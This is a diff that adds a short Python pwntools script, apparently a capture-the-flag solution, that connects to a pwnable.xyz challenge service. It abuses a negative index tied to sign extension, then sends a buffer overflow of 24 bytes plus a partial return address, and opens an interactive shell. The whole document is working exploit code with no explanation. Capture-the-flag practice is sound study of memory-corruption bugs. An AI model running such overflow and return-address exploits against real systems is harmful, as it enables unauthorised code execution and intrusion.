@@ -1,0 +1,21 @@
+# movsx   rax, ax
+
+from pwn import *
+#s=process("./challenge")
+s=remote("svc.pwnable.xyz",'30009')
+#pause()
+s.recv(1024)
+s.send("a"*16)
+s.recv(1024)
+s.send("1\n")
+s.recv(1024)
+s.send("-1\n")
+s.recv(1024)
+s.send("2\n")
+s.recv(1024)
+s.send("3\n")
+s.send("a"*24+"\xd6\x09\x40")
+s.recv(1024)
+s.send("1\n")
+s.interactive()
+s.close()
